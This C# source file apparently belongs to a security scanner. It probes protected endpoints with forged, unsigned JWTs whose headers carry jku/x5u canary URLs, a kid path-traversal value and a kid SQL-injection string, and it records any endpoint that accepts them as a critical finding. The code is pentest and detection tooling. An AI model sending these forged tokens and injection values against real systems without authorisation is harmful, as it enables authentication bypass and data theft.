using System.Text;
using System.Text.Json;
using System.Text.Json.Nodes;
using Trowser.Automation;

namespace Trowser.Security;

/// <summary>
/// JWT header abuse: unsigned tokens with jku/x5u/kid mutations against protected endpoints.
/// Critical when unsigned token is accepted with sensitive/API body; jku/x5u canary URLs do not prove out-of-band SSRF.
/// Inspired by PortSwigger JWT attacks and RFC 7515/7517; also influenced by pentest-ai <c>web.jwt_jku_x5u_ssrf</c>.
/// </summary>
public static class JwtHeaderAbuseProbe
{
    public const string JkuCanary = "https://trowser-jku-canary.example/.well-known/jwks.json";
    public const string X5uCanary = "https://trowser-x5u-canary.example/cert.pem";

    public sealed class ProbeOptions
    {
        public string? Host { get; set; }
        public string? BaseToken { get; set; }
        public int MaxEndpoints { get; set; } = 10;
        public int TimeoutMs { get; set; } = 15000;
        public bool RegisterChainFindings { get; set; } = true;
    }

    public sealed class ProbeFinding
    {
        public string Url { get; init; } = "";
        public string Test { get; init; } = "";
        public string Severity { get; init; } = "medium";
        public string Category { get; init; } = "jwt-header-abuse";
        public string Title { get; init; } = "";
        public string Detail { get; init; } = "";
        public int AnonStatus { get; init; }
        public int ProbeStatus { get; init; }
        public string? TokenUsed { get; init; }
    }

    public sealed class ProbeResult
    {
        public List<ProbeFinding> Findings { get; init; } = [];
        public List<string> Summary { get; init; } = [];
        public int EndpointsTested { get; init; }
        public string? JwtSource { get; init; }
        public bool IsClean => Findings.Count == 0;
    }

    private static readonly string[] DefaultProtectedPaths =
    [
        "/me", "/api/users/me", "/api/me", "/api/profile",
        "/rest/user/whoami", "/api/account", "/api/Users/1", "/api/users/1"
    ];

    private static readonly (string Name, Func<JsonObject, JsonObject> Mutator)[] HeaderTests =
    [
        ("jku_header_accepted", h => { h["jku"] = JkuCanary; return h; }),
        ("x5u_header_accepted", h => { h["x5u"] = X5uCanary; return h; }),
        ("kid_path_traversal", h => { h["kid"] = "../../../dev/null"; return h; }),
        ("kid_sqli", h => { h["kid"] = "' OR '1'='1"; return h; }),
    ];

    public static async Task<ProbeResult> RunAsync(
        AutomationContext ctx,
        ProbeOptions options,
        CancellationToken ct = default)
    {
        var baseToken = JwtProbeHelpers.NormalizeBearerToken(options.BaseToken);
        string? jwtSource = baseToken != null ? "explicit" : null;

        if (string.IsNullOrWhiteSpace(baseToken))
        {
            var analyzed = await HttpSecurityProbes.RunJwtAnalyzeAsync(ctx, null, ct);
            var pick = analyzed.Tokens.FirstOrDefault(t =>
                string.Equals(t.HeaderAlg, "RS256", StringComparison.OrdinalIgnoreCase)
                || string.Equals(t.HeaderAlg, "ES256", StringComparison.OrdinalIgnoreCase))
                ?? analyzed.Tokens.FirstOrDefault();
            baseToken = JwtProbeHelpers.TokenForProbe(pick);
            jwtSource = string.IsNullOrWhiteSpace(baseToken) ? null : pick?.Source;
        }

        if (string.IsNullOrWhiteSpace(baseToken))
        {
            return new ProbeResult
            {
                Summary =
                [
                    "No JWT available — pass baseToken or browse/login first so jwt-analyze can harvest a token."
                ],
                JwtSource = jwtSource
            };
        }

        var (headerObj, payloadObj) = ParseJwtParts(baseToken);
        if (headerObj == null || payloadObj == null)
        {
            return new ProbeResult
            {
                Summary = ["Could not parse base JWT header/payload."],
                JwtSource = jwtSource
            };
        }

        var urls = await ResolveTargetUrlsAsync(ctx, options, ct);
        var findings = new List<ProbeFinding>();
        var tested = 0;

        foreach (var url in urls)
        {
            ct.ThrowIfCancellationRequested();
            if (!Uri.TryCreate(url, UriKind.Absolute, out _))
                continue;

            var anon = await SecurityProbeHttp.FetchAsync(ctx, url, "GET", null, null, options.TimeoutMs,
                includeBrowserCookies: false, ct);
            if (anon.Status is not (401 or 403))
                continue;

            tested++;

            foreach (var (testName, mutator) in HeaderTests)
            {
                ct.ThrowIfCancellationRequested();
                var forgedHeader = mutator(headerObj.DeepClone() as JsonObject ?? new JsonObject());
                var token = ForgeFromParts(forgedHeader, payloadObj);
                var headers = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
                {
                    ["Authorization"] = $"Bearer {token}"
                };

                var probe = await SecurityProbeHttp.FetchAsync(ctx, url, "GET", headers, null, options.TimeoutMs,
                    includeBrowserCookies: false, ct);

                var body = probe.Body ?? "";
                var acceptedWithEvidence = probe.Status is >= 200 and < 300
                    && (JwtProbeHelpers.LooksLikeAdminShape(body)
                        || JwtProbeHelpers.LooksSensitive(body, url));

                if (acceptedWithEvidence)
                {
                    findings.Add(new ProbeFinding
                    {
                        Url = url,
                        Test = testName,
                        Severity = "critical",
                        Category = "jwt-header-abuse",
                        Title = AcceptanceTitle(testName),
                        Detail = AcceptanceDetail(testName, anon.Status, probe.Status),
                        AnonStatus = anon.Status,
                        ProbeStatus = probe.Status,
                        TokenUsed = TruncateToken(token)
                    });
                    continue;
                }

                if (probe.Status >= 500 && JwtProbeHelpers.TraceExposesJwtParser(probe.Body ?? ""))
                {
                    findings.Add(new ProbeFinding
                    {
                        Url = url,
                        Test = testName,
                        Severity = "medium",
                        Category = "jwt-header-abuse",
                        Title = $"JWT parser exposure on {testName} probe",
                        Detail = $"Forged JWT ({testName}) caused HTTP {probe.Status} with kid/jku/x5u trace markers. " +
                                 "Parser leak does not confirm out-of-band SSRF.",
                        AnonStatus = anon.Status,
                        ProbeStatus = probe.Status,
                        TokenUsed = TruncateToken(token)
                    });
                }
            }
        }

        if (options.RegisterChainFindings)
            RegisterFindings(ctx, findings);

        var summary = new List<string>();
        if (findings.Count == 0)
            summary.Add($"Tested {tested} gated endpoint(s); no jku/x5u/kid abuse signals.");
        else
            summary.Add($"{findings.Count} JWT header-abuse finding(s).");

        return new ProbeResult
        {
            Findings = findings,
            Summary = summary,
            EndpointsTested = tested,
            JwtSource = jwtSource
        };
    }

    private static async Task<List<string>> ResolveTargetUrlsAsync(
        AutomationContext ctx,
        ProbeOptions options,
        CancellationToken ct)
    {
        var fromSurface = JwtProbeHelpers.SelectCandidateEndpoints(ctx, options.Host, options.MaxEndpoints)
            .Select(ep => ep.Url)
            .Where(u => !string.IsNullOrWhiteSpace(u))
            .ToList();

        ct.ThrowIfCancellationRequested();
        var pageUrl = await ctx.GetCurrentUrl();
        var origin = Uri.TryCreate(pageUrl, UriKind.Absolute, out var pageUri)
            ? pageUri.GetLeftPart(UriPartial.Authority)
            : "";

        foreach (var path in DefaultProtectedPaths)
        {
            if (fromSurface.Count >= options.MaxEndpoints) break;
            var url = origin + path;
            if (!fromSurface.Contains(url, StringComparer.OrdinalIgnoreCase))
                fromSurface.Add(url);
        }

        return fromSurface.Take(Math.Max(1, options.MaxEndpoints)).ToList();
    }

    private static (JsonObject? header, JsonObject? payload) ParseJwtParts(string token)
    {
        var parts = token.Split('.');
        if (parts.Length < 2) return (null, null);
        try
        {
            var headerJson = Encoding.UTF8.GetString(JwtProbeHelpers.Base64UrlDecode(parts[0]));
            var payloadJson = Encoding.UTF8.GetString(JwtProbeHelpers.Base64UrlDecode(parts[1]));
            return (
                JsonNode.Parse(headerJson) as JsonObject,
                JsonNode.Parse(payloadJson) as JsonObject);
        }
        catch
        {
            return (null, null);
        }
    }

    private static string ForgeFromParts(JsonObject header, JsonObject payload)
    {
        var h = header.ToJsonString();
        var p = payload.ToJsonString();
        return $"{JwtProbeHelpers.Base64UrlEncode(Encoding.UTF8.GetBytes(h))}.{JwtProbeHelpers.Base64UrlEncode(Encoding.UTF8.GetBytes(p))}.";
    }

    private static string TruncateToken(string token) =>
        token.Length > 80 ? token[..40] + "…" + token[^20..] : token;

    private static string AcceptanceTitle(string testName) => testName switch
    {
        "jku_header_accepted" => "jku header accepted (unsigned)",
        "x5u_header_accepted" => "x5u header accepted (unsigned)",
        _ => $"JWT {testName} accepted on protected endpoint"
    };

    private static string AcceptanceDetail(string testName, int anonStatus, int probeStatus)
    {
        var core =
            $"Anonymous GET → {anonStatus}; unsigned forged JWT ({testName}) → {probeStatus} with sensitive/API or admin-shaped body.";
        if (testName is "jku_header_accepted" or "x5u_header_accepted")
            return core + " Canary URL in the JWT header is not out-of-band SSRF confirmation.";
        return core;
    }

    private static void RegisterFindings(AutomationContext ctx, List<ProbeFinding> findings)
    {
        foreach (var f in findings)
        {
            ctx.AddManualChainFinding(new ChainEngine.ChainableFinding
            {
                Id = $"jwt-header-{Math.Abs((f.Url + f.Test).GetHashCode(StringComparison.Ordinal))}",
                Category = f.Category,
                Severity = f.Severity,
                Endpoint = f.Url,
                Method = "GET",
                Source = "jwt-header-abuse",
                Title = f.Title,
                Detail = f.Detail
            });
        }
    }
}
